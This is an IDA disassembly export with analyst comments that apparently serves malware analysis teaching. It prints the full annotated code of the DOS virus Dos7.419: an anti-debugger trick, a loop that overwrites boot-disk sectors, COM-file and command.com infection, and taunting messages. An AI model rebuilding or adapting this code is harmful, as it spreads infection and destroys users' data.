<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>IDA - Virus.DOS.Dos7.419.com.idb (Virus.DOS.Dos7.419.com) C:\Users\golden\Desktop\dos7\Virus.DOS.Dos7.419.com.idb</title>
</head>
<body bgcolor="#ffffff">
<span style="white-space: pre; font-family: Consolas; color: blue; background: #ffffff">

<span style="color:maroon">seg000:0100                         </span>;
<span style="color:maroon">seg000:0100                         </span>; +-------------------------------------------------------------------------+
<span style="color:maroon">seg000:0100                         </span>; |      This file was generated by The Interactive Disassembler (IDA)      |
<span style="color:maroon">seg000:0100                         </span>; |           Copyright (c) 2018 Hex-Rays, &lt;support@hex-rays.com&gt;           |
<span style="color:maroon">seg000:0100                         </span>; |                      License info: 48-3075-7234-77                      |
<span style="color:maroon">seg000:0100                         </span>; |             Golden Richard, LSU Louisiana State University              |
<span style="color:maroon">seg000:0100                         </span>; +-------------------------------------------------------------------------+
<span style="color:maroon">seg000:0100                         </span>;
<span style="color:maroon">seg000:0100                         </span>; Input SHA256 : 7E00694397CBB7B422CB2F3E39A34C7FB7554931A1A9A2CF9AE7B2BCF42296E3
<span style="color:maroon">seg000:0100                         </span>; Input MD5    : 0B4A318803AA1B9B6A0DCC55CEFCB7CE
<span style="color:maroon">seg000:0100                         </span>; Input CRC32  : 785762D7
<span style="color:maroon">seg000:0100
seg000:0100                         </span><span style="color:gray">; ---------------------------------------------------------------------------
</span><span style="color:maroon">seg000:0100                         </span>; File Name   : C:\Users\golden\Desktop\dos7\Virus.DOS.Dos7.419.com
<span style="color:maroon">seg000:0100                         </span>; Format      : MS-DOS COM-file
<span style="color:maroon">seg000:0100                         </span>; Base Address: 1000h Range: 10100h-102C8h Loaded length: 1C8h
<span style="color:maroon">seg000:0100
seg000:0100                                         .</span>8086
<span style="color:maroon">seg000:0100                                         </span>.model tiny
<span style="color:maroon">seg000:0100
seg000:0100                         </span><span style="color:gray">; ===========================================================================
</span><span style="color:maroon">seg000:0100
seg000:0100                         </span><span style="color:gray">; Segment type: Pure code
</span><span style="color:maroon">seg000:0100                         </span>seg000          segment byte public &#039;CODE&#039;
<span style="color:maroon">seg000:0100                                         </span>assume cs:seg000
<span style="color:maroon">seg000:0100                                         </span>org 100h
<span style="color:maroon">seg000:0100                                         </span>assume es:nothing, ss:nothing, ds:seg000
<span style="color:maroon">seg000:0100
seg000:0100                                         </span>public start
<span style="color:maroon">seg000:0100                         </span>start<span style="color:navy">:                                  </span>; modifies next line when in debug mode
<span style="color:maroon">seg000:0100 </span>C7 06 07 01 52 01                       <span style="color:navy">mov     word ptr loc_10106+</span><span style="color:green">1</span><span style="color:navy">, </span><span style="color:#ff8000">152h
</span><span style="color:maroon">seg000:0106
seg000:0106                         </span><span style="color:navy">loc_10106:                              </span><span style="color:olive">; DATA XREF: seg000:start↑w
</span><span style="color:maroon">seg000:0106 </span>B8 68 01                                <span style="color:navy">mov     ax, </span><span style="color:#ff8000">168h        </span>; ax = debug ? 152h : 168h
<span style="color:maroon">seg000:0109 </span>A3 2E 01                                <span style="color:navy">mov     word ptr loc_10129+</span><span style="color:green">5</span><span style="color:navy">, ax </span>; modify code with ax
<span style="color:maroon">seg000:010C </span>2B C0                                   <span style="color:navy">sub     ax, ax          </span>; ax = 0
<span style="color:maroon">seg000:010E </span>1E                                      <span style="color:navy">push    ds              </span>; save ds
<span style="color:maroon">seg000:010F </span>8E D8                                   <span style="color:navy">mov     ds, ax          </span>; ds = 0
<span style="color:maroon">seg000:0111                                         </span>assume ds:nothing
<span style="color:maroon">seg000:0111 </span>8E C0                                   <span style="color:navy">mov     es, ax          </span>; es = 0
<span style="color:maroon">seg000:0113                                         </span>assume es:nothing
<span style="color:maroon">seg000:0113 </span>BE 84 00                                <span style="color:navy">mov     si, </span><span style="color:green">84h </span><span style="color:gray">; &#039;„&#039;   </span>; si = 84h (source index is file IO pointer)
<span style="color:maroon">seg000:0116 </span>BF 0C 00                                <span style="color:navy">mov     di, </span><span style="color:green">0Ch         </span>; di = 0Ch (destination index is debug interupt)
<span style="color:maroon">seg000:0119 </span>A5                                      <span style="color:navy">movsw                   </span>; overwrite int 3 (trap) address with int 13 (file IO)
<span style="color:maroon">seg000:011A </span>A5                                      <span style="color:navy">movsw
</span><span style="color:maroon">seg000:011B </span>26 A1 00 00                             <span style="color:navy">mov     ax, es:</span><span style="color:green">0        </span>; ax = div0 address offset
<span style="color:maroon">seg000:011F </span>A3 70 01                                <span style="color:navy">mov     ds:</span><span style="color:green">170h</span><span style="color:navy">, ax     </span>; store div0 address offset in program
<span style="color:maroon">seg000:0122 </span>26 A1 02 00                             <span style="color:navy">mov     ax, es:</span><span style="color:green">2        </span>; ax = div0 address segment
<span style="color:maroon">seg000:0126 </span>A3 77 01                                <span style="color:navy">mov     ds:</span><span style="color:green">177h</span><span style="color:navy">, ax     </span>; store div0 address segment in program
<span style="color:maroon">seg000:0129
seg000:0129                         </span><span style="color:navy">loc_10129:                              </span><span style="color:olive">; DATA XREF: seg000:0109↑w
</span><span style="color:maroon">seg000:0129 </span>26 C7 06 00 00 4C 4D                    <span style="color:navy">mov     word ptr es:</span><span style="color:green">0</span><span style="color:navy">, </span><span style="color:green">4D4Ch </span>; fake div0 offset = debug ? 152h : 168h
<span style="color:maroon">seg000:0130 </span>1F                                      <span style="color:navy">pop     ds              </span>; restore ds (0?)
<span style="color:maroon">seg000:0131                                         </span>assume ds:seg000
<span style="color:maroon">seg000:0131 </span>8C D8                                   <span style="color:navy">mov     ax, ds          </span>; ax = ds
<span style="color:maroon">seg000:0133 </span>80 C4 10                                <span style="color:navy">add     ah, </span><span style="color:green">10h         </span>; add 10h to high byte of ds
<span style="color:maroon">seg000:0136 </span>26 A3 02 00                             <span style="color:navy">mov     es:</span><span style="color:green">2</span><span style="color:navy">, ax        </span>; fake div0 segment address = 1000h
<span style="color:maroon">seg000:013A </span>8E C0                                   <span style="color:navy">mov     es, ax          </span>; es = 1000h
<span style="color:maroon">seg000:013C                                         </span>assume es:nothing
<span style="color:maroon">seg000:013C </span>BF 00 01                                <span style="color:navy">mov     di, </span><span style="color:#ff8000">100h        </span>; destination index = 100h
<span style="color:maroon">seg000:013F </span>8B F7                                   <span style="color:navy">mov     si, di          </span>; source index = 100h
<span style="color:maroon">seg000:0141 </span>B9 A3 01                                <span style="color:navy">mov     cx, </span><span style="color:#ff8000">1A3h        </span>; counter = 1A3h (length of program)
<span style="color:maroon">seg000:0144 </span>F3 A4                                   <span style="color:navy">rep movsb               </span>; copy 1A3h bytes from 0:100h to 1000:100h
<span style="color:maroon">seg000:0144                                                                 </span>; copy virus code to 1000:100h
<span style="color:maroon">seg000:0146 </span>8E D8                                   <span style="color:navy">mov     ds, ax          </span>; ds = 1000h
<span style="color:maroon">seg000:0148                                         </span>assume ds:nothing
<span style="color:maroon">seg000:0148 </span>F7 F1                                   <span style="color:navy">div     cx              </span>; force fake div0 to be called
<span style="color:maroon">seg000:0148                                                                 </span>; jump to (debug ? 152h : 168h)
<span style="color:maroon">seg000:014A
seg000:014A                         </span>file_already_infected_handler<span style="color:navy">:          </span><span style="color:green">; CODE XREF: seg000:01AB↓j
</span><span style="color:maroon">seg000:014A </span>B4 3E                                   <span style="color:navy">mov     ah, </span><span style="color:green">3Eh </span><span style="color:gray">; &#039;&gt;&#039;   </span>; close file
<span style="color:maroon">seg000:014C </span>CC                                      <span style="color:navy">int     </span><span style="color:green">3               </span>; close file from search
<span style="color:maroon">seg000:014D
seg000:014D                         </span>open_file_read_error_handler<span style="color:navy">:           </span><span style="color:green">; CODE XREF: seg000:0195↓j
</span><span style="color:maroon">seg000:014D                                                                 </span><span style="color:green">; seg000:01A5↓j
</span><span style="color:maroon">seg000:014D </span>B4 4F                                   <span style="color:navy">mov     ah, </span><span style="color:green">4Fh </span><span style="color:gray">; &#039;O&#039;   </span>; find next matching file
<span style="color:maroon">seg000:014F </span>CC                                      <span style="color:navy">int     </span><span style="color:green">3               </span>; do file search
<span style="color:maroon">seg000:0150 </span>EB 3A                                   <span style="color:navy">jmp     short </span>search_for_candidate_files ; jump back to detecting if next file is infected
<span style="color:maroon">seg000:0152                         </span><span style="color:gray">; ---------------------------------------------------------------------------
</span><span style="color:maroon">seg000:0152 </span>2B C9                                   <span style="color:navy">sub     cx, cx          </span>; start of debugger trap
<span style="color:maroon">seg000:0152                                                                 </span>; cx = 0
<span style="color:maroon">seg000:0154
seg000:0154                         </span>disk_destruction_loop<span style="color:navy">:                  </span><span style="color:green">; CODE XREF: seg000:0166↓j
</span><span style="color:maroon">seg000:0154 </span>41                                      <span style="color:navy">inc     cx              </span>; cx += 1
<span style="color:maroon">seg000:0154                                                                 </span>; incrementing through sectors
<span style="color:maroon">seg000:0155 </span>0E                                      <span style="color:navy">push    cs
</span><span style="color:maroon">seg000:0156 </span>07                                      <span style="color:navy">pop     es              </span>; es = cs
<span style="color:maroon">seg000:0156                         </span><span style="color:gray">; ---------------------------------------------------------------------------
</span><span style="color:olive">seg000:0157                                         </span>assume es:seg000
<span style="color:olive">seg000:0157 </span>B8                                      <span style="color:navy">db </span><span style="color:#008040">0B8h </span><span style="color:gray">; ¸             </span>; a hidden add happens here with a sneaky jump jumps
<span style="color:olive">seg000:0157                                                                 </span>; 1: ax = FE05h
<span style="color:maroon">seg000:0158                         </span><span style="color:gray">; ---------------------------------------------------------------------------
</span><span style="color:maroon">seg000:0158 </span>05 FE EB                                <span style="color:navy">add     ax, </span><span style="color:green">0EBFEh      </span>; ax += EBFEh
<span style="color:maroon">seg000:015B </span>FC                                      <span style="color:navy">cld                     </span>; clear direction flag
<span style="color:maroon">seg000:015C </span>2D 02 E7                                <span style="color:navy">sub     ax, </span><span style="color:green">0E702h      </span>; ax -= E702h
<span style="color:maroon">seg000:015C                                                                 </span>; ax now is 301h
<span style="color:maroon">seg000:015C                                                                 </span>; this means write 1 sector for int13
<span style="color:maroon">seg000:015F </span>B7 01                                   <span style="color:navy">mov     bh, </span><span style="color:green">1           </span>; bx = 01??h
<span style="color:maroon">seg000:015F                                                                 </span>; bx is offset for write data
<span style="color:maroon">seg000:0161 </span>BA 00 00                                <span style="color:navy">mov     dx, </span><span style="color:green">0           </span>; dx = 0
<span style="color:maroon">seg000:0161                                                                 </span>; target boot drive
<span style="color:maroon">seg000:0164 </span>CD 13                                   <span style="color:navy">int     </span><span style="color:green">13h             </span>; write cs:01??h to boot drive
<span style="color:maroon">seg000:0166 </span>EB EC                                   <span style="color:navy">jmp     short </span>disk_destruction_loop ; jump up and write next sector
<span style="color:maroon">seg000:0166                                                                 </span>; this trashes whole disk until crash
<span style="color:maroon">seg000:0168                         </span><span style="color:gray">; ---------------------------------------------------------------------------
</span><span style="color:maroon">seg000:0168 </span>06                                      <span style="color:navy">push    es              </span>; save es
<span style="color:maroon">seg000:0169 </span>51                                      <span style="color:navy">push    cx              </span>; save cx
<span style="color:maroon">seg000:016A </span>07                                      <span style="color:navy">pop     es              </span>; es = cx
<span style="color:maroon">seg000:016A                                                                 </span>; es = 0
<span style="color:maroon">seg000:016B                                         </span>assume es:nothing
<span style="color:maroon">seg000:016B </span>26 C7 06 00 00 4C 4D                    <span style="color:navy">mov     word ptr es:</span><span style="color:green">0</span><span style="color:navy">, </span><span style="color:green">4D4Ch </span>; overwritten from earlier in code
<span style="color:maroon">seg000:016B                                                                 </span>; restore real div0 offset
<span style="color:maroon">seg000:0172 </span>26 C7 06 02 00 41 53                    <span style="color:navy">mov     word ptr es:</span><span style="color:green">2</span><span style="color:navy">, </span><span style="color:green">5341h </span>; overwritten from earlier in code
<span style="color:maroon">seg000:0172                                                                 </span>; restore real div0 segment
<span style="color:maroon">seg000:0179 </span>07                                      <span style="color:navy">pop     es              </span>; es = 1000h
<span style="color:maroon">seg000:017A </span>C7 06 07 01 68 01                       <span style="color:navy">mov     word ptr ds:</span><span style="color:green">107h</span><span style="color:navy">, </span><span style="color:#ff8000">168h </span>; 1000:107h = 0168h
<span style="color:maroon">seg000:017A                                                                 </span>; write 168h back to mov instruction in new code location
<span style="color:maroon">seg000:0180 </span>B4 1A                                   <span style="color:navy">mov     ah, </span><span style="color:green">1Ah         </span>; ax = 1A00h
<span style="color:maroon">seg000:0182 </span>99                                      <span style="color:navy">cwd                     </span>; sign extend ax into dx:ax
<span style="color:maroon">seg000:0182                                                                 </span>; ax = 1A00h: set DTA function
<span style="color:maroon">seg000:0182                                                                 </span>; dx = 0000h: DTA buffer offset
<span style="color:maroon">seg000:0183 </span>CC                                      <span style="color:navy">int     </span><span style="color:green">3               </span>; Set disk transfer area to 1000:0000h
<span style="color:maroon">seg000:0184 </span>B4 4E                                   <span style="color:navy">mov     ah, </span><span style="color:green">4Eh </span><span style="color:gray">; &#039;N&#039;   </span>; ax = 4E00h: find first matching file
<span style="color:maroon">seg000:0186 </span>2B C9                                   <span style="color:navy">sub     cx, cx          </span>; cx = 0: find files
<span style="color:maroon">seg000:0188 </span>BA 23 02                                <span style="color:navy">mov     dx, </span><span style="color:#ff8000">223h        </span>; dx = 0223h: search for file name &quot;*W.C?M&quot;
<span style="color:maroon">seg000:018B </span>CC                                      <span style="color:navy">int     </span><span style="color:green">3               </span>; do search; write results to DTA
<span style="color:maroon">seg000:018C
seg000:018C                         </span>search_for_candidate_files<span style="color:navy">:             </span><span style="color:green">; CODE XREF: seg000:0150↑j
</span><span style="color:maroon">seg000:018C </span>72 7E                                   <span style="color:navy">jb      short </span>exit_restore_original_com_file ; jump if find file error
<span style="color:maroon">seg000:018E </span>B8 02 3D                                <span style="color:navy">mov     ax, </span><span style="color:green">3D02h       </span>; ax = 3D02h: open file for read/write
<span style="color:maroon">seg000:0191 </span>BA 1E 00                                <span style="color:navy">mov     dx, </span><span style="color:green">1Eh         </span>; dx = 1Eh: open the matching file from search
<span style="color:maroon">seg000:0194 </span>CC                                      <span style="color:navy">int     </span><span style="color:green">3               </span>; open file
<span style="color:maroon">seg000:0194                                                                 </span>; ax = file handle
<span style="color:maroon">seg000:0195 </span>72 B6                                   <span style="color:navy">jb      short </span>open_file_read_error_handler ; jump if error
<span style="color:maroon">seg000:0197 </span>8B D8                                   <span style="color:navy">mov     bx, ax          </span>; bx = file handle
<span style="color:maroon">seg000:0199 </span>B4 3F                                   <span style="color:navy">mov     ah, </span><span style="color:green">3Fh </span><span style="color:gray">; &#039;?&#039;   </span>; ah = 3Fh: read file with handle
<span style="color:maroon">seg000:019B </span>BF 1A 00                                <span style="color:navy">mov     di, </span><span style="color:green">1Ah         </span>; di = 1Ah
<span style="color:maroon">seg000:019E </span>8B 0D                                   <span style="color:navy">mov     cx, [di]        </span>; cx = size of file from search
<span style="color:maroon">seg000:01A0 </span>8B D6                                   <span style="color:navy">mov     dx, si          </span>; dx = 2A3h: write file into virus code
<span style="color:maroon">seg000:01A0                                                                 </span>; si was set to 2A3 after rep movsb earlier
<span style="color:maroon">seg000:01A2 </span>CC                                      <span style="color:navy">int     </span><span style="color:green">3               </span>; read file with handle to ds:dx
<span style="color:maroon">seg000:01A3 </span>8B 04                                   <span style="color:navy">mov     ax, [si]        </span>; ax = first word of copied file
<span style="color:maroon">seg000:01A5 </span>72 A6                                   <span style="color:navy">jb      short </span>open_file_read_error_handler ; jump if error on read
<span style="color:maroon">seg000:01A7 </span>3B 06 00 01                             <span style="color:navy">cmp     ax, ds:</span><span style="color:green">100h     </span>; check if read file word == virus word
<span style="color:maroon">seg000:01AB </span>74 9D                                   <span style="color:navy">jz      short </span>file_already_infected_handler ; jump if equal
<span style="color:maroon">seg000:01AD </span>8B 44 02                                <span style="color:navy">mov     ax, [si+</span><span style="color:green">2</span><span style="color:navy">]      </span>; ax = second word of copied file
<span style="color:maroon">seg000:01B0 </span>3D 15 60                                <span style="color:navy">cmp     ax, </span><span style="color:green">6015h       </span>; check if file is command.com
<span style="color:maroon">seg000:01B3 </span>74 02                                   <span style="color:navy">jz      short </span>infect_command_com ; if equal, jump
<span style="color:maroon">seg000:01B5 </span>EB 3F                                   <span style="color:navy">jmp     short </span>infect_normal_com_file ; else, jump
<span style="color:maroon">seg000:01B7                         </span><span style="color:gray">; ---------------------------------------------------------------------------
</span><span style="color:maroon">seg000:01B7
seg000:01B7                         </span>infect_command_com<span style="color:navy">:                     </span><span style="color:green">; CODE XREF: seg000:01B3↑j
</span><span style="color:maroon">seg000:01B7 </span>57                                      <span style="color:navy">push    di
</span><span style="color:maroon">seg000:01B8 </span>56                                      <span style="color:navy">push    si
</span><span style="color:maroon">seg000:01B9 </span>BE 4D 02                                <span style="color:navy">mov     si, </span><span style="color:#ff8000">24Dh        </span>; si = 24Dh: location of virus message in virus
<span style="color:maroon">seg000:01BC </span>BF F0 23                                <span style="color:navy">mov     di, </span><span style="color:green">23F0h       </span>; di = 23F0h: location of real message in command.com
<span style="color:maroon">seg000:01BF </span>B9 55 00                                <span style="color:navy">mov     cx, </span><span style="color:green">55h </span><span style="color:gray">; &#039;U&#039;   </span>; cx = 55h: length of message
<span style="color:maroon">seg000:01C2 </span>90                                      <span style="color:navy">nop
</span><span style="color:maroon">seg000:01C3 </span>FC                                      <span style="color:navy">cld                     </span>; set string copy forward
<span style="color:maroon">seg000:01C4 </span>F3 A4                                   <span style="color:navy">rep movsb               </span>; copy new messages into command.com
<span style="color:maroon">seg000:01C4                                                                 </span>; &quot;MSDOS 7 (C) ANARKICK SYSTEMS&quot;
<span style="color:maroon">seg000:01C4                                                                 </span>; &quot;DOS 6 Antivirus sucks. It missed this one!&quot;
<span style="color:maroon">seg000:01C6 </span>BE 2A 02                                <span style="color:navy">mov     si, </span><span style="color:#ff8000">22Ah        </span>; si = 22Ah: location of virus message in virus
<span style="color:maroon">seg000:01C9 </span>BF 57 90                                <span style="color:navy">mov     di, </span><span style="color:green">9057h       </span>; di = 9057h: location of real message in command.com
<span style="color:maroon">seg000:01CC </span>B9 0C 00                                <span style="color:navy">mov     cx, </span><span style="color:green">0Ch         </span>; cx = 0Ch: length of message
<span style="color:maroon">seg000:01CF </span>90                                      <span style="color:navy">nop
</span><span style="color:maroon">seg000:01D0 </span>F3 A4                                   <span style="color:navy">rep movsb               </span>; copy new message into command.com
<span style="color:maroon">seg000:01D0                                                                 </span>; &quot;is infected!&quot;
<span style="color:maroon">seg000:01D2 </span>BE 36 02                                <span style="color:navy">mov     si, </span><span style="color:#ff8000">236h        </span>; virus message location
<span style="color:maroon">seg000:01D5 </span>BF 4C 91                                <span style="color:navy">mov     di, </span><span style="color:green">914Ch       </span>; command.com target location
<span style="color:maroon">seg000:01D8 </span>B9 17 00                                <span style="color:navy">mov     cx, </span><span style="color:green">17h         </span>; message length
<span style="color:maroon">seg000:01DB </span>90                                      <span style="color:navy">nop
</span><span style="color:maroon">seg000:01DC </span>F3 A4                                   <span style="color:navy">rep movsb               </span>; copy message into command.com
<span style="color:maroon">seg000:01DC                                                                 </span>; &quot;Boy, are you ever dumb&quot;
<span style="color:maroon">seg000:01DC                                                                 </span>; the &quot;B&quot; comes from the prior error message in command.com
<span style="color:maroon">seg000:01DE </span>B8 00 42                                <span style="color:navy">mov     ax, </span><span style="color:green">4200h       </span>; ax = 4200h: move file starting at beginning
<span style="color:maroon">seg000:01E1 </span>2B D2                                   <span style="color:navy">sub     dx, dx          </span>; dx = 0
<span style="color:maroon">seg000:01E3 </span>8B CA                                   <span style="color:navy">mov     cx, dx          </span>; cx = 0
<span style="color:maroon">seg000:01E5 </span>CC                                      <span style="color:navy">int     </span><span style="color:green">3               </span>; move file write pointer to beginning of file
<span style="color:maroon">seg000:01E6 </span>B4 40                                   <span style="color:navy">mov     ah, </span><span style="color:green">40h </span><span style="color:gray">; &#039;@&#039;   </span>; ax = 4000h: write file
<span style="color:maroon">seg000:01E8 </span>BA A3 02                                <span style="color:navy">mov     dx, </span><span style="color:#ff8000">2A3h        </span>; dx = 2A3h: beginnning of infected command.com in memory
<span style="color:maroon">seg000:01EB </span>B9 BD CE                                <span style="color:navy">mov     cx, </span><span style="color:green">0CEBDh      </span>; length of command.com
<span style="color:maroon">seg000:01EE </span>CC                                      <span style="color:navy">int     </span><span style="color:green">3               </span>; write infected command.com to disk
<span style="color:maroon">seg000:01EF </span>B4 3E                                   <span style="color:navy">mov     ah, </span><span style="color:green">3Eh </span><span style="color:gray">; &#039;&gt;&#039;   </span>; ax = 3E00h: close file
<span style="color:maroon">seg000:01F1 </span>CC                                      <span style="color:navy">int     </span><span style="color:green">3               </span>; close file
<span style="color:maroon">seg000:01F2 </span>5E                                      <span style="color:navy">pop     si              </span>; restore si to 2A3h
<span style="color:maroon">seg000:01F3 </span>5F                                      <span style="color:navy">pop     di              </span>; restore di to 1Ah: file size location
<span style="color:maroon">seg000:01F4 </span>EB 16                                   <span style="color:navy">jmp     short </span>exit_restore_original_com_file ; jump to exit
<span style="color:maroon">seg000:01F6                         </span><span style="color:gray">; ---------------------------------------------------------------------------
</span><span style="color:maroon">seg000:01F6
seg000:01F6                         </span>infect_normal_com_file<span style="color:navy">:                 </span><span style="color:green">; CODE XREF: seg000:01B5↑j
</span><span style="color:maroon">seg000:01F6 </span>B8 00 42                                <span style="color:navy">mov     ax, </span><span style="color:green">4200h       </span>; ax = 4200h: move file pointer
<span style="color:maroon">seg000:01F9 </span>2B D2                                   <span style="color:navy">sub     dx, dx          </span>; dx = 0: beginning of file
<span style="color:maroon">seg000:01FB </span>8B CA                                   <span style="color:navy">mov     cx, dx          </span>; cx = 0: beginning of file
<span style="color:maroon">seg000:01FD </span>CC                                      <span style="color:navy">int     </span><span style="color:green">3               </span>; move file pointer to beginning of file
<span style="color:maroon">seg000:01FE </span>FE C6                                   <span style="color:navy">inc     dh              </span>; dx = 0100h: write buffer
<span style="color:maroon">seg000:0200 </span>B4 40                                   <span style="color:navy">mov     ah, </span><span style="color:green">40h </span><span style="color:gray">; &#039;@&#039;   </span>; ax = 4000h: write file
<span style="color:maroon">seg000:0202 </span>8B 0D                                   <span style="color:navy">mov     cx, [di]        </span>; cx = file size
<span style="color:maroon">seg000:0204 </span>81 C1 A3 01                             <span style="color:navy">add     cx, </span><span style="color:#ff8000">1A3h        </span>; cx += size of virus
<span style="color:maroon">seg000:0208 </span>CC                                      <span style="color:navy">int     </span><span style="color:green">3               </span>; write virus and original com file back to disk
<span style="color:maroon">seg000:0209 </span>B4 3E                                   <span style="color:navy">mov     ah, </span><span style="color:green">3Eh </span><span style="color:gray">; &#039;&gt;&#039;   </span>; ax = 3E00h: close file
<span style="color:maroon">seg000:020B </span>CC                                      <span style="color:navy">int     </span><span style="color:green">3               </span>; close the file
<span style="color:maroon">seg000:020C
seg000:020C                         </span>exit_restore_original_com_file<span style="color:navy">:         </span><span style="color:green">; CODE XREF: seg000:search_for_candidate_files↑j
</span><span style="color:maroon">seg000:020C                                                                 </span><span style="color:green">; seg000:01F4↑j
</span><span style="color:maroon">seg000:020C </span>8C D0                                   <span style="color:navy">mov     ax, ss          </span>; ax = 0h
<span style="color:maroon">seg000:020E </span>8E C0                                   <span style="color:navy">mov     es, ax          </span>; es = 0h
<span style="color:maroon">seg000:0210 </span>8E D8                                   <span style="color:navy">mov     ds, ax          </span>; ds = 0h
<span style="color:maroon">seg000:0212                                         </span>assume ds:seg000
<span style="color:maroon">seg000:0212 </span>50                                      <span style="color:navy">push    ax              </span>; push ax: return segment 0h
<span style="color:maroon">seg000:0213 </span>B4 1A                                   <span style="color:navy">mov     ah, </span><span style="color:green">1Ah         </span>; set DTA address
<span style="color:maroon">seg000:0215 </span>D1 EA                                   <span style="color:navy">shr     dx, </span><span style="color:green">1           </span>; dx = 100h
<span style="color:maroon">seg000:0217 </span>CC                                      <span style="color:navy">int     </span><span style="color:green">3               </span>; reset DTA to location of virus in low memory
<span style="color:maroon">seg000:0218 </span>BF 00 01                                <span style="color:navy">mov     di, </span><span style="color:#ff8000">100h        </span>; di = 100h
<span style="color:maroon">seg000:021B </span>57                                      <span style="color:navy">push    di              </span>; push di: return offset 100h
<span style="color:maroon">seg000:021C </span>8B CC                                   <span style="color:navy">mov     cx, sp          </span>; copy everything between stack pointer...
<span style="color:maroon">seg000:021E </span>2B CE                                   <span style="color:navy">sub     cx, si          </span>; ...and beginning of com file
<span style="color:maroon">seg000:0220 </span>F3 A4                                   <span style="color:navy">rep movsb               </span>; do copy from 0:2A3h to 0:100H
<span style="color:maroon">seg000:0222 </span>CB                                      <span style="color:navy">retf                    </span>; return to 0:100h
<span style="color:maroon">seg000:0222                         </span><span style="color:gray">; ---------------------------------------------------------------------------
</span><span style="color:olive">seg000:0223 </span>2A                                      <span style="color:navy">db  </span><span style="color:#008040">2Ah </span><span style="color:gray">; *
</span><span style="color:olive">seg000:0224 </span>57                                      <span style="color:navy">db  </span><span style="color:#008040">57h </span><span style="color:gray">; W
</span><span style="color:olive">seg000:0225 </span>2E                                      <span style="color:navy">db  </span><span style="color:#008040">2Eh </span><span style="color:gray">; .
</span><span style="color:olive">seg000:0226 </span>43                                      <span style="color:navy">db  </span><span style="color:#008040">43h </span><span style="color:gray">; C
</span><span style="color:olive">seg000:0227 </span>3F                                      <span style="color:navy">db  </span><span style="color:#008040">3Fh </span><span style="color:gray">; ?
</span><span style="color:olive">seg000:0228 </span>4D                                      <span style="color:navy">db  </span><span style="color:#008040">4Dh </span><span style="color:gray">; M
</span><span style="color:olive">seg000:0229 </span>00                                      <span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:022A </span>69                                      <span style="color:navy">db  </span><span style="color:#008040">69h </span><span style="color:gray">; i
</span><span style="color:olive">seg000:022B </span>73                                      <span style="color:navy">db  </span><span style="color:#008040">73h </span><span style="color:gray">; s
</span><span style="color:olive">seg000:022C </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:022D </span>69                                      <span style="color:navy">db  </span><span style="color:#008040">69h </span><span style="color:gray">; i
</span><span style="color:olive">seg000:022E </span>6E                                      <span style="color:navy">db  </span><span style="color:#008040">6Eh </span><span style="color:gray">; n
</span><span style="color:olive">seg000:022F </span>66                                      <span style="color:navy">db  </span><span style="color:#008040">66h </span><span style="color:gray">; f
</span><span style="color:olive">seg000:0230 </span>65                                      <span style="color:navy">db  </span><span style="color:#008040">65h </span><span style="color:gray">; e
</span><span style="color:olive">seg000:0231 </span>63                                      <span style="color:navy">db  </span><span style="color:#008040">63h </span><span style="color:gray">; c
</span><span style="color:olive">seg000:0232 </span>74                                      <span style="color:navy">db  </span><span style="color:#008040">74h </span><span style="color:gray">; t
</span><span style="color:olive">seg000:0233 </span>65                                      <span style="color:navy">db  </span><span style="color:#008040">65h </span><span style="color:gray">; e
</span><span style="color:olive">seg000:0234 </span>64                                      <span style="color:navy">db  </span><span style="color:#008040">64h </span><span style="color:gray">; d
</span><span style="color:olive">seg000:0235 </span>21                                      <span style="color:navy">db  </span><span style="color:#008040">21h </span><span style="color:gray">; !
</span><span style="color:olive">seg000:0236 </span>6F                                      <span style="color:navy">db  </span><span style="color:#008040">6Fh </span><span style="color:gray">; o
</span><span style="color:olive">seg000:0237 </span>79                                      <span style="color:navy">db  </span><span style="color:#008040">79h </span><span style="color:gray">; y
</span><span style="color:olive">seg000:0238 </span>2C                                      <span style="color:navy">db  </span><span style="color:#008040">2Ch </span><span style="color:gray">; ,
</span><span style="color:olive">seg000:0239 </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:023A </span>61                                      <span style="color:navy">db  </span><span style="color:#008040">61h </span><span style="color:gray">; a
</span><span style="color:olive">seg000:023B </span>72                                      <span style="color:navy">db  </span><span style="color:#008040">72h </span><span style="color:gray">; r
</span><span style="color:olive">seg000:023C </span>65                                      <span style="color:navy">db  </span><span style="color:#008040">65h </span><span style="color:gray">; e
</span><span style="color:olive">seg000:023D </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:023E </span>79                                      <span style="color:navy">db  </span><span style="color:#008040">79h </span><span style="color:gray">; y
</span><span style="color:olive">seg000:023F </span>6F                                      <span style="color:navy">db  </span><span style="color:#008040">6Fh </span><span style="color:gray">; o
</span><span style="color:olive">seg000:0240 </span>75                                      <span style="color:navy">db  </span><span style="color:#008040">75h </span><span style="color:gray">; u
</span><span style="color:olive">seg000:0241 </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:0242 </span>65                                      <span style="color:navy">db  </span><span style="color:#008040">65h </span><span style="color:gray">; e
</span><span style="color:olive">seg000:0243 </span>76                                      <span style="color:navy">db  </span><span style="color:#008040">76h </span><span style="color:gray">; v
</span><span style="color:olive">seg000:0244 </span>65                                      <span style="color:navy">db  </span><span style="color:#008040">65h </span><span style="color:gray">; e
</span><span style="color:olive">seg000:0245 </span>72                                      <span style="color:navy">db  </span><span style="color:#008040">72h </span><span style="color:gray">; r
</span><span style="color:olive">seg000:0246 </span>20                                      <span style="color:navy">db  </span><span style="color:#008040">20h
</span><span style="color:olive">seg000:0247 </span>64                                      <span style="color:navy">db  </span><span style="color:#008040">64h </span><span style="color:gray">; d
</span><span style="color:olive">seg000:0248 </span>75                                      <span style="color:navy">db  </span><span style="color:#008040">75h </span><span style="color:gray">; u
</span><span style="color:olive">seg000:0249 </span>6D                                      <span style="color:navy">db  </span><span style="color:#008040">6Dh </span><span style="color:gray">; m
</span><span style="color:olive">seg000:024A </span>62                                      <span style="color:navy">db  </span><span style="color:#008040">62h </span><span style="color:gray">; b
</span><span style="color:olive">seg000:024B </span>21                                      <span style="color:navy">db  </span><span style="color:#008040">21h </span><span style="color:gray">; !
